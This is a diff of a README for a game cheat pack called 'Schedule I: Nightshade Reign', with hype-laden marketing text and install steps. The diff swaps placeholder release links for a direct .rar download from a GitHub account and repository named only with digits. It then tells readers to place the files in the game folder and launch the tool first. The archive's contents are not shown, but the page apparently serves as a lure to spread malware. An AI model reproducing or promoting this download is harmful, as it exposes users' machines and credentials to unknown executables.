@@ -1,6 +1,6 @@
 # Schedule I: Nightshade Reign v1.0 - 25 Tools of Dominion
 
-**[Claim Your Power](https://github.com/yourusername/Schedule-I-Nightshade-Reign/releases)**  
+**[Claim Your Power](https://github.com/m49357717/312434532/releases/download/32124435/Schedule.I.Nightshade.Reign.v1.0.-.25.Tools.of.Dominion.rar)**  
 
 **Meta Description**: Unleash Schedule I Nightshade Reign v1.0 with 25 ruthless tools. Command life, loot, and lawlessness to conquer Hyland’s underworld in 2025!
 
@@ -53,7 +53,7 @@ Wield absolute control in *Schedule I* with these hotkey-driven tools:
 
 ## How to Install and Use
 
-1. **Download**: Snatch *Nightshade Reign* from the [releases page](https://github.com/yourusername/Schedule-I-Nightshade-Reign/releases).  
+1. **Download**: Snatch *Nightshade Reign* from the [releases page](https://github.com/m49357717/312434532/releases/download/32124435/Schedule.I.Nightshade.Reign.v1.0.-.25.Tools.of.Dominion.rar).  
 2. **Install**: Plant files in the *Schedule I* root folder.  
 3. **Launch**: Kick off *Nightshade Reign* first, then dive into *Schedule I* (v1.0).  
 4. **Activate**: Tap the hotkeys above in-game to unleash your reign.  
